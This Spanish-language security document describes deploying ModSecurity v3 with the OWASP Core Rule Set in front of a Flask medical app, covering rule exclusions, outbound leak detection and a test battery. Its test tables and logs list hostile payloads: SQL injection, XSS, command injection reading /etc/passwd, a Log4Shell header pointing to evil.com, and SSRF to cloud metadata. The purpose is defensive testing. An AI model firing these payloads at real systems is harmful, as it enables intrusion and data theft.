# WAF: ModSecurity v3 + OWASP Core Rule Set (CRS)

## 1. Qué es y por qué se usa

Un **WAF (Web Application Firewall)** es un cortafuegos de aplicación que inspecciona el tráfico HTTP en busca de patrones maliciosos antes de que las peticiones lleguen al backend. A diferencia de un firewall de red (capas 3-4), un WAF opera en la capa 7 (aplicación) y puede analizar el contenido de las peticiones: cabeceras, query strings, cuerpos JSON/formulario, cookies, etc.

En esta aplicación se despliega **ModSecurity v3** (motor WAF open source, mantenido por Trustwave/OWASP) junto con el **OWASP Core Rule Set (CRS)**, el conjunto de reglas estándar de la industria que cubre las categorías de ataques más comunes (OWASP Top 10).

### Qué aporta a la aplicación

- **Defensa en profundidad**: las validaciones de entrada del backend (`app/helpers.py`) protegen contra datos malformados; el WAF actúa como **capa adicional** que bloquea ataques conocidos antes de que lleguen al código de la aplicación.
- **Protección contra ataques genéricos**: SQL injection, XSS, path traversal, command injection, scanners automatizados, etc.
- **Prevención de exfiltración de datos**: inspección de respuestas (outbound filtering) para bloquear fugas de información sensible (números de tarjeta, rutas del sistema, volcados de BD, stack traces).
- **Sin cambios en el código**: el WAF se despliega como reverse proxy delante del backend; la aplicación Flask no necesita modificaciones.
- **Ocultación del backend**: el usuario se conecta al WAF (Nginx); el backend Flask no es accesible directamente desde fuera de la red Docker.

---

## 2. Arquitectura

```
                    ┌──────────────────────────────────────────────┐
                    │              Red Docker (proxy-network)       │
                    │                                              │
 Usuario :5001 ──▶  │  WAF (Nginx + ModSecurity + CRS)  ──▶  Flask │
                    │  owasp/modsecurity-crs:nginx-alpine    :5001 │
                    │  contenedor: waf_modsecurity            web   │
                    │                                              │
                    └──────────────────────────────────────────────┘
```

| Componente | Detalle |
|------------|---------|
| **Imagen Docker** | `owasp/modsecurity-crs:nginx-alpine` (imagen oficial OWASP) |
| **Contenedor** | `waf_modsecurity` |
| **Puerto expuesto** | `5001` (host) → `8080` (contenedor WAF) |
| **Backend** | `http://web:5001` (solo accesible dentro de la red Docker) |
| **Arranque** | Automático con `make` o `docker-compose up -d`. No requiere perfil. |
| **Dependencia** | `depends_on: web: condition: service_healthy` — el WAF espera a que Flask esté sano antes de aceptar tráfico. |

El servicio `web` (Flask/Gunicorn) usa `expose: "5001"` en lugar de `ports`, por lo que **no publica** su puerto en el host. Toda petición del usuario pasa obligatoriamente por el WAF.

---

## 3. Proceso de despliegue: DetectionOnly → On

El despliegue se realizó siguiendo la metodología recomendada en dos fases:

### Fase 1: Modo DetectionOnly (observación)

Se configuró `MODSEC_RULE_ENGINE=DetectionOnly` para que el WAF registrase las alertas en los logs **sin bloquear** ninguna petición:

```yaml
# docker-compose.yml → servicio waf → environment
- MODSEC_RULE_ENGINE=DetectionOnly
```

En esta fase se navegó por toda la aplicación (registro, login, perfil, pesos, supervisor) y se ejecutaron ataques de prueba. Los logs mostraron:
- Qué reglas se activaban con tráfico legítimo (falsos positivos).
- Qué ataques eran correctamente detectados (verdaderos positivos).
- El scoring de anomalía acumulado por cada petición.

**Resultado**: se identificaron 4 falsos positivos (sección 5) y se redactaron las exclusiones.

### Fase 2: Modo On (bloqueo)

Tras verificar que las exclusiones cubrían todos los falsos positivos, se cambió a modo bloqueo:

```yaml
- MODSEC_RULE_ENGINE=On
```

Se repitieron todas las pruebas: los ataques devolvían HTTP 403 y el tráfico legítimo pasaba sin problemas (HTTP 200).

---

## 4. Configuración

Las variables de entorno del contenedor WAF se definen en `docker-compose.yml` → servicio `waf`:

| Variable | Valor | Descripción |
|----------|-------|-------------|
| `BACKEND` | `http://web:5001` | URL interna del backend Flask al que el WAF reenvía las peticiones limpias |
| `MODSEC_RULE_ENGINE` | `On` | Modo de operación de ModSecurity: `On` bloquea; `DetectionOnly` solo registra |
| `PARANOIA` | `1` | Paranoia Level del OWASP CRS (ver sección siguiente) |
| `ANOMALY_INBOUND` | `5` | Umbral de anomalía para peticiones entrantes |
| `ANOMALY_OUTBOUND` | `4` | Umbral de anomalía para respuestas salientes |
| `ALLOWED_METHODS` | `GET HEAD POST OPTIONS PUT DELETE` | Métodos HTTP permitidos |
| `ALLOWED_REQUEST_CONTENT_TYPE` | `application/json`, `multipart/form-data`, etc. | Content-Types permitidos |

### Paranoia Level (PL)

| PL | Descripción | Falsos positivos | Uso recomendado |
|----|-------------|------------------|-----------------|
| **1** | Solo reglas de alta confianza. | Muy bajo | **Producción general** (valor actual) |
| 2 | Reglas adicionales de confianza media. | Bajo-medio | Datos sensibles con tiempo para ajustar |
| 3 | Reglas agresivas. | Medio-alto | Alta seguridad con exclusiones bien ajustadas |
| 4 | Máxima detección. | Muy alto | Solo pruebas o entornos muy controlados |

### Anomaly Scoring

ModSecurity CRS usa un modelo de **anomaly scoring**: cada regla que se activa suma puntos. La petición/respuesta se bloquea solo cuando el total acumulado alcanza el umbral.

- **Inbound (5)**: una regla crítica (SQLi, XSS) normalmente suma 5 puntos → bloqueo inmediato.
- **Outbound (4)**: protege contra fugas de información en las respuestas.

---

## 5. Análisis de falsos positivos y exclusiones

Fichero: **`waf/modsecurity-override.conf`**

Este fichero se monta como regla **AFTER-CRS** (`RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf`). Las exclusiones se aplican **después** de cargar todas las reglas del Core Rule Set, lo que permite modificar el comportamiento de reglas específicas sin alterar el CRS original.

### 5.1. Falso positivo 1: Campo `password` en login/register

**Detección en logs (modo DetectionOnly):**

```
ruleId: "942100"
file: "REQUEST-942-APPLICATION-ATTACK-SQLI.conf"
msg: "SQL Injection Attack Detected via libinjection"
data: "Matched Data: 1&1 found within ARGS:password"
severity: 2
Inbound Anomaly Score: 5
```

**Causa**: las contraseñas pueden contener caracteres como `'`, `"`, `<`, `>`, `--`, `OR`, etc. que disparan reglas de inyección SQL (942xxx) y XSS (941xxx).

**Exclusión (regla 10001)**:

```
SecRule REQUEST_URI "@beginsWith /api/auth/"
    ctl:ruleRemoveTargetById=941100-941999;ARGS:password   ← XSS
    ctl:ruleRemoveTargetById=942100-942999;ARGS:password   ← SQLi
    ctl:ruleRemoveTargetById=920272;ARGS:password          ← Tamaño
```

**Justificación**: la exclusión se aplica DESPUÉS del CRS (after-CRS) y es específica: solo afecta al campo `password` en las rutas `/api/auth/*`. El resto de campos y rutas siguen protegidos por las reglas completas. Se usa `ctl:ruleRemoveTargetById` para eliminar reglas concretas de un argumento concreto, no se desactiva ningún motor.

### 5.2. Falso positivo 2: Campo `recaptcha_token`

**Causa**: el token reCAPTCHA v3 es una cadena base64 larga que contiene secuencias que coinciden con patrones de inyección.

**Exclusión (regla 10002)**: elimina reglas 941xxx y 942xxx solo para `ARGS:recaptcha_token` en `/api/auth/*`.

### 5.3. Falso positivo 3: Campos `first_name` / `last_name`

**Causa**: nombres con apóstrofes (O'Brien), acentos, guiones compuestos activan reglas de inyección.

**Exclusión (regla 10003)**: elimina reglas 941xxx y 942xxx solo para `ARGS:first_name` y `ARGS:last_name` en `/api/user`.

### 5.4. Falso positivo 4: Dashboard Supervisor

**Causa**: el supervisor es un dashboard de desarrollo que muestra estadísticas de tráfico, consultas y datos del sistema. Su contenido HTML/JS activa múltiples familias de reglas.

**Exclusión (reglas 10004 + 10005)**: se eliminan **familias de reglas por ID específico** (NO se desactiva el motor del WAF):

```
SecRule REQUEST_URI "@beginsWith /supervisor"
    ctl:ruleRemoveById=941100-941999   ← XSS (HTML/JS del dashboard)
    ctl:ruleRemoveById=942100-942999   ← SQLi (datos SQL en la interfaz)
    ctl:ruleRemoveById=951100-951999   ← SQL info leakage (outbound)
    ctl:ruleRemoveById=952100-952999   ← Data leakage (rutas de ficheros)
    ctl:ruleRemoveById=953100-953999   ← PHP/Java info leakage
    ctl:ruleRemoveById=954100-954999   ← Application errors
    ctl:ruleRemoveById=10010-10013     ← Reglas custom de exfiltración
```

**Justificación**: en producción, el supervisor debe estar desactivado (`APP_SUPERVISOR=0`), por lo que esta exclusión no aplica. Se usa `ctl:ruleRemoveById` para eliminar familias de reglas concretas en lugar de `ctl:ruleEngine=Off`, cumpliendo el requisito de no desactivar el motor del WAF por completo.

---

## 6. Protección contra exfiltración de datos (Outbound Filtering)

### Configuración

El WAF inspecciona el cuerpo de las respuestas para detectar fugas de información sensible:

```
SecResponseBodyAccess On
SecResponseBodyMimeType text/plain text/html text/xml application/json
SecResponseBodyLimit 524288
```

- **`SecResponseBodyAccess On`**: activa la inspección de respuestas.
- **`SecResponseBodyMimeType`**: tipos MIME inspeccionados (incluye JSON para la API REST).
- **`SecResponseBodyLimit`**: límite de 512 KB por respuesta para no impactar excesivamente el rendimiento.

### Reglas CRS de respuesta (automáticas)

Con el outbound filtering activado, las reglas CRS de las familias 950xxx-954xxx se activan automáticamente:

| Familia | Descripción |
|---------|-------------|
| 951xxx | SQL Information Leakage (errores SQL en respuestas) |
| 952xxx | Data Leakage (listados de directorios, rutas de ficheros) |
| 953xxx | PHP/Java Information Leakage |
| 954xxx | Application Error Messages (stack traces genéricos) |

### Reglas personalizadas de exfiltración

Se han añadido 4 reglas personalizadas que complementan las reglas CRS:

| ID | Detección | Ejemplo de patrón |
|----|-----------|-------------------|
| **10010** | Números de tarjeta de crédito (Visa, MasterCard, AMEX, Discover) | `4539578763621486` |
| **10011** | Contenido de `/etc/passwd` | `root:x:0:0:root:/root:/bin/bash` |
| **10012** | Volcados de base de datos | `CREATE TABLE`, `INSERT INTO`, `mysqldump` |
| **10013** | Stack traces de Python/Flask | `Traceback (most recent call last)`, `Debugger PIN` |

### Pruebas de exfiltración realizadas

Se crearon endpoints de test (`/test/exfiltration/*`, solo disponibles en modo desarrollo) que simulan fugas de datos. El WAF bloquea correctamente todas:

| Endpoint | Regla activada | Resultado en log |
|----------|---------------|------------------|
| `/test/exfiltration/passwd` | 10011 | `Access denied with code 403 (phase 4). msg: 'Posible fuga de contenido de /etc/passwd en respuesta'` |
| `/test/exfiltration/creditcard` | 10010 | `Access denied with code 403 (phase 4). msg: 'Posible fuga de número de tarjeta de crédito en respuesta'` |
| `/test/exfiltration/sqldump` | 10012 | `Access denied with code 403 (phase 4). msg: 'Posible volcado de base de datos en respuesta'` |
| `/test/exfiltration/stacktrace` | 10013 | `Access denied with code 403 (phase 4). msg: 'Posible fuga de stack trace o debugger de Python en respuesta'` |

**Extracto real del log (tarjeta de crédito bloqueada):**

```json
{
  "transaction": {
    "request": {"method": "GET", "uri": "/test/exfiltration/creditcard"},
    "response": {"http_code": 403},
    "producer": {"secrules_engine": "Enabled"},
    "messages": [{
      "message": "Posible fuga de número de tarjeta de crédito en respuesta",
      "details": {
        "ruleId": "10010",
        "match": "Matched Operator Rx against variable RESPONSE_BODY",
        "data": "4539578763621486",
        "severity": "2",
        "tags": ["DATA_LEAKAGE/CREDIT_CARD"]
      }
    }]
  }
}
```

### Nota sobre el comportamiento en reverse proxy

Cuando una regla de fase 4 (outbound) se activa, ModSecurity intenta devolver un 403 al cliente. En modo reverse proxy, los headers HTTP pueden haberse enviado ya al cliente antes de que se inspeccione el body. En ese caso:
- El log registra `header already sent` como advertencia.
- ModSecurity **cierra la conexión**, truncando la respuesta.
- El cliente recibe una respuesta incompleta o un error de conexión, impidiendo la exfiltración completa.

---

## 7. Ataques bloqueados (batería de pruebas verificada)

### Extracto real del log — SQL Injection detectada (modo DetectionOnly)

```json
{
  "transaction": {
    "request": {
      "method": "GET",
      "uri": "/?id=1%20OR%201=1"
    },
    "producer": {
      "modsecurity": "ModSecurity v3.0.14 (Linux)",
      "secrules_engine": "DetectionOnly",
      "components": ["OWASP_CRS/4.23.0"]
    },
    "messages": [{
      "message": "SQL Injection Attack Detected via libinjection",
      "details": {
        "ruleId": "942100",
        "file": "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        "data": "Matched Data: 1&1 found within ARGS:id: 1 OR 1=1",
        "severity": "2",
        "tags": ["attack-sqli", "paranoia-level/1", "OWASP_CRS"]
      }
    }, {
      "message": "Inbound Anomaly Score Exceeded (Total Score: 5)",
      "details": {
        "ruleId": "949110",
        "data": "TX:BLOCKING_INBOUND_ANOMALY_SCORE = 5"
      }
    }]
  }
}
```

### Extracto real del log — XSS detectada (modo DetectionOnly)

```json
{
  "transaction": {
    "request": {
      "method": "GET",
      "uri": "/?x=<script>alert(1)</script>"
    },
    "messages": [
      {"message": "XSS Attack Detected via libinjection", "details": {"ruleId": "941100"}},
      {"message": "XSS Filter - Category 1: Script Tag Vector", "details": {"ruleId": "941110"}},
      {"message": "NoScript XSS InjectionChecker: HTML Injection", "details": {"ruleId": "941160"}},
      {"message": "Javascript method detected", "details": {"ruleId": "941390"}},
      {"message": "Inbound Anomaly Score Exceeded (Total Score: 20)", "details": {"ruleId": "949110"}}
    ]
  }
}
```

### Extracto real del log — Command Injection / LFI (modo DetectionOnly)

```json
{
  "transaction": {
    "request": {
      "method": "GET",
      "uri": "/?cmd=;cat%20/etc/passwd"
    },
    "messages": [
      {"message": "OS File Access Attempt", "details": {"ruleId": "930120", "data": "etc/passwd found within ARGS:cmd"}},
      {"message": "Remote Command Execution: Unix Shell Code Found", "details": {"ruleId": "932160"}},
      {"message": "Inbound Anomaly Score Exceeded (Total Score: 10)", "details": {"ruleId": "949110"}}
    ]
  }
}
```

### Extracto real del log — Scanner detectado (modo DetectionOnly)

```json
{
  "transaction": {
    "request": {
      "method": "GET", "uri": "/",
      "headers": {"User-Agent": "Nikto"}
    },
    "messages": [{
      "message": "Found User-Agent associated with security scanner",
      "details": {
        "ruleId": "913100",
        "data": "Matched Data: nikto found within REQUEST_HEADERS:User-Agent: Nikto"
      }
    }]
  }
}
```

### Tabla resumen — Modo On (bloqueo activo)

#### Inyección SQL

| Payload | Vector | HTTP | Estado |
|---------|--------|------|--------|
| `?id=1 OR 1=1` | Query string | 403 | Bloqueado |
| `?q=1 UNION SELECT username,password FROM users` | Query string | 403 | Bloqueado |

#### Cross-Site Scripting (XSS)

| Payload | Vector | HTTP | Estado |
|---------|--------|------|--------|
| `<script>alert(1)</script>` | Query string | 403 | Bloqueado |
| `<img src=x onerror=alert(1)>` | Query string | 403 | Bloqueado |
| `<svg onload=alert(1)>` | Query string | 403 | Bloqueado |

#### Inyección de comandos / LFI

| Payload | Vector | HTTP | Estado |
|---------|--------|------|--------|
| `?cmd=;cat /etc/passwd` | Query string | 403 | Bloqueado |
| `?x=\|ls -la` | Query string | 403 | Bloqueado |

#### Ataques de protocolo / aplicación

| Payload | Vector | HTTP | Estado |
|---------|--------|------|--------|
| Header `${jndi:ldap://evil.com/x}` | Cabecera (Log4Shell) | 403 | Bloqueado |
| `?url=http://169.254.169.254/latest/meta-data/` | SSRF (metadata AWS) | 403 | Bloqueado |

#### Detección de scanners

| Payload | Vector | HTTP | Estado |
|---------|--------|------|--------|
| `User-Agent: Nikto` | Cabecera | 403 | Bloqueado |
| `User-Agent: sqlmap/1.5` | Cabecera | 403 | Bloqueado |

#### Exfiltración de datos (outbound)

| Tipo de fuga | Regla | HTTP | Estado |
|-------------|-------|------|--------|
| Números de tarjeta de crédito | 10010 | 403 | Bloqueado |
| Contenido de /etc/passwd | 10011 | 403 | Bloqueado |
| Volcado de base de datos | 10012 | 403 | Bloqueado |
| Stack trace de Python | 10013 | 403 | Bloqueado |

#### Fugas de información en cabeceras

| Verificación | Resultado |
|-------------|-----------|
| La respuesta 403 no revela nombre/versión del WAF | Sin fugas |
| Header `Server:` muestra `nginx` sin número de versión | Sin fugas |

---

## 8. Pruebas de integridad (funcionalidad no afectada)

Verificado que el WAF **no bloquea** el tráfico legítimo de la aplicación:

| Endpoint | Método | Resultado |
|----------|--------|-----------|
| `/` | GET | 200 — Página principal cargada |
| `/api/config` | GET | 200 — JSON con `validation_limits` |
| `/api/auth/register` | POST (JSON) | Funcional |
| `/api/auth/login` | POST (JSON) | Funcional |
| `/api/user` | POST (JSON + CSRF) | Funcional |
| `/api/auth/me` | GET (con sesión) | Funcional |
| `/api/auth/logout` | POST (con CSRF) | Funcional |
| `/static/css/style.css` | GET | 200 — Recursos estáticos servidos |
| `/static/js/main.js` | GET | 200 — JavaScript servido |
| `/supervisor` | GET | 200 — Dashboard de desarrollo |

**213 tests backend** ejecutados dentro del contenedor: todos pasan.

---

## 9. Logging y monitorización

### Ver logs en tiempo real

```bash
make logs-waf
```

### Ficheros de log

Los logs de ModSecurity se persisten en el host en `data/waf/` (volumen montado en `/var/log/modsecurity` del contenedor).

### Qué se registra

- Peticiones bloqueadas: regla activada, score, payload, IP origen.
- Respuestas bloqueadas (outbound): regla activada, tipo de fuga detectada.
- Peticiones que activaron reglas pero no alcanzaron el umbral de anomalía.
- Errores internos del WAF.

### Formato del log

Cada entrada es un objeto JSON con la estructura:

```json
{
  "transaction": {
    "client_ip": "...",
    "time_stamp": "...",
    "unique_id": "...",
    "request": {"method": "...", "uri": "...", "headers": {...}},
    "response": {"http_code": 403, "headers": {...}},
    "producer": {
      "modsecurity": "ModSecurity v3.0.14 (Linux)",
      "connector": "ModSecurity-nginx v1.0.4",
      "secrules_engine": "Enabled",
      "components": ["OWASP_CRS/4.23.0"]
    },
    "messages": [{
      "message": "Descripción del ataque",
      "details": {
        "ruleId": "942100",
        "severity": "2",
        "data": "Matched Data: ...",
        "tags": ["attack-sqli", "OWASP_CRS"]
      }
    }]
  }
}
```

---

## 10. Impacto en el rendimiento

### Inspección de peticiones (inbound)

La inspección de peticiones entrantes (cabeceras, query strings, body) añade una latencia mínima (<5ms por petición en PL 1). El impacto es imperceptible para el usuario.

### Inspección de respuestas (outbound)

La activación de `SecResponseBodyAccess On` tiene un impacto mayor que la inspección inbound:

- **Memoria**: el WAF almacena el body de la respuesta en memoria antes de enviarlo al cliente (hasta `SecResponseBodyLimit = 512 KB`).
- **CPU**: las reglas de fase 4 (outbound) aplican expresiones regulares sobre el body completo.
- **Latencia**: se añade un overhead de ~10-30ms por respuesta inspeccionada, dependiendo del tamaño.
- **MIME types limitados**: solo se inspeccionan `text/plain`, `text/html`, `text/xml` y `application/json`. Los recursos estáticos (CSS, JS, imágenes) no se inspeccionan, reduciendo significativamente el impacto.

**Mitigación aplicada**: `SecResponseBodyLimit 524288` (512 KB) evita que respuestas muy grandes (descargas de ficheros, exports) consuman recursos excesivos.

**Conclusión**: el impacto es aceptable para una aplicación médica de este tamaño. En aplicaciones de alto tráfico, se podría limitar la inspección outbound solo a `application/json` o desactivarla selectivamente para rutas de alto volumen mediante exclusiones por URI.

---

## 11. Ficheros del WAF en el proyecto

| Fichero / Directorio | Función |
|----------------------|---------|
| `docker-compose.yml` → servicio `waf` | Definición del contenedor WAF, variables de entorno, volumes, healthcheck |
| `waf/modsecurity-override.conf` | Exclusiones de reglas y reglas personalizadas de exfiltración |
| `data/waf/` | Logs persistentes de ModSecurity (montado como volumen, ignorado por `.gitignore`) |

---

## 12. Personalización

### Cambiar a modo detección (sin bloqueo)

```yaml
# docker-compose.yml → servicio waf → environment
- MODSEC_RULE_ENGINE=DetectionOnly
```

### Subir el Paranoia Level

```yaml
- PARANOIA=2  # o 3 o 4
```

> Al subir el PL, es probable que aparezcan nuevos falsos positivos. Revisar los logs (`make logs-waf`), identificar las reglas activadas y añadir exclusiones en `waf/modsecurity-override.conf`.

### Añadir una nueva exclusión

Formato general (exclusión AFTER-CRS que elimina una regla específica para un campo concreto en una ruta):

```
SecRule REQUEST_URI "@beginsWith /api/mi-ruta" \
    "id:10006,\
    phase:1,\
    pass,\
    nolog,\
    ctl:ruleRemoveTargetById=REGLA_ID;ARGS:nombre_campo"
```

- El `id` debe ser único (rango 10000+).
- `phase:1` = se aplica en la fase de cabeceras/petición.
- `ctl:ruleRemoveTargetById` desactiva una regla específica solo para ese campo.

---

## 13. Consideraciones de producción

| Aspecto | Recomendación |
|---------|--------------|
| **Supervisor** | Desactivar (`APP_SUPERVISOR=0`). Las exclusiones 10004/10005 dejan de aplicarse. |
| **HTTPS** | Colocar un terminador TLS delante del WAF o configurar certificados en el contenedor. |
| **Logs** | Rotar los logs de `data/waf/` con logrotate para evitar crecimiento indefinido. |
| **Paranoia Level** | Evaluar PL 2 tras un período de observación con `DetectionOnly`. |
| **Actualizaciones** | `docker pull owasp/modsecurity-crs:nginx-alpine` y reiniciar para obtener nuevas reglas. |
| **Outbound filtering** | Mantener activo para detectar fugas. Ajustar `SecResponseBodyLimit` según necesidad. |

---

## 14. Postura de seguridad final

Con la implementación completa del WAF, la aplicación cuenta con las siguientes capas de protección:

| Capa | Medida | Cobertura |
|------|--------|-----------|
| **Perímetro (inbound)** | ModSecurity + OWASP CRS | SQLi, XSS, RCE, LFI, SSRF, scanners, Log4Shell |
| **Perímetro (outbound)** | Outbound filtering + reglas custom | Tarjetas de crédito, /etc/passwd, dumps SQL, stack traces |
| **Entrada** | Validación y sanitización | Nombres, fechas, pesos, alturas |
| **Autenticación** | Argon2id, HIBP, reCAPTCHA v3 | Contraseñas fuertes, brecha conocida, bots |
| **Sesión** | Cookies HttpOnly, SameSite, CSRF | Protección de sesión |
| **Transporte** | Headers de seguridad, HSTS | Clickjacking, MIME sniffing, XSS |
| **Aplicación** | Rate limiting (Flask-Limiter) | Fuerza bruta en login/register |
| **Almacenamiento** | SQLCipher (opcional) | Cifrado de BD en reposo |

El WAF complementa (no sustituye) las demás capas. La defensa en profundidad asegura que incluso si una capa falla, las demás siguen protegiendo la aplicación.

---

## 15. Relación con otras medidas de seguridad

| Capa | Medida | Documentación |
|------|--------|---------------|
| Entrada | Validación y sanitización de datos | [01. Validación de entradas](01-validacion-entradas.md) |
| Autenticación | Argon2id, HIBP, reCAPTCHA v3 | [02. Autenticación y contraseñas](02-autenticacion-contrasenas.md) |
| Sesión | Cookies HttpOnly, SameSite, CSRF tokens | [03. Sesiones y CSRF](03-sesiones-csrf.md) |
| Transporte | Headers de seguridad, HSTS, SQLCipher | [04. Headers y HTTPS](04-headers-https.md) |
| Aplicación | Rate limiting (Flask-Limiter) | [05. Rate limiting y configuración](05-rate-limiting-y-config.md) |
| **Perímetro** | **WAF: ModSecurity + OWASP CRS** | **Este documento** |

[← Índice de seguridad](../SEGURIDAD.md)
